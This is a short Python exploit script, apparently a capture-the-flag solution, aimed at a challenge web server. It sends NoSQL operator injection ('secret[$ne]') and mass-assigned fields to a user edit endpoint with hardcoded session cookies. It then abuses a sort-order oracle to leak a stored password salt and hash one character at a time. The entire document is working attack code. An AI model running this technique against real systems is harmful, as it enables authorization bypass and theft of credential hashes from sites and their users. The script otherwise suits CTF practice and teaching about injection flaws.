import requests


URL = "http://chall.blackpinker.com:33508"
wordlist = [i for i in "0123456789abcdefghijklmnopqrstuvwxyz"]

session = requests.Session()
cookies = {
    "session": "eyJmbGFzaCI6e30sInBhc3Nwb3J0Ijp7InVzZXIiOiJhYmMifX0=",
    "session.sig": "w062Oy4ByjwDE9XD8Y21B-csZqU"
}

# Viết lại script để tự động hóa quy trình register

salt = "" 
for index_salt in range(32):
    for i in range(len(wordlist)):
        data = {
            "data.fullname": "abc",
            "data.email": "",
            "data.phone": "",
            "data.website": "",
            "secret[$ne]": "null",
            "data.address.street": "",
            "data.address.city": "",
            "data.address.state": "",
            "data.address.zip": "",
            "salt": f"{salt}{wordlist[i]}"
        }
        
        res = session.post(f"{URL}/user/abc/edit", data=data, cookies=cookies, allow_redirects=False)
        res = session.get(f"{URL}/users?limit=1&sort=salt", cookies=cookies)    
        if "Throughout Heaven and Earth, I alone am the honored one" in res.text:
            if index_salt == 31:
                salt += wordlist[i]
                break
            salt += wordlist[i - 1]
            print(f"Found salt: {salt}")
            break
print(f"Final salt: {salt}")

hashed = "" 
for index_salt in range(64):
    for i in range(len(wordlist)):
        data = {
            "data.fullname": "abc",
            "data.email": "",
            "data.phone": "",
            "data.website": "",
            "secret[$ne]": "null",
            "data.address.street": "",
            "data.address.city": "",
            "data.address.state": "",
            "data.address.zip": "",
            "hash": f"{hashed}{wordlist[i]}"
        }
        
        res = session.post(f"{URL}/user/abc/edit", data=data, cookies=cookies, allow_redirects=False)
        res = session.get(f"{URL}/users?limit=1&sort=hash", cookies=cookies)    
        if "Throughout Heaven and Earth, I alone am the honored one" in res.text:
            if index_salt == 63:
                hashed += wordlist[i]
                break
                
            hashed += wordlist[i - 1]
            print(f"Found hashed: {hashed}")
            break
print(f"Final hash: {hashed}")
print(f"Final salt: {salt}")
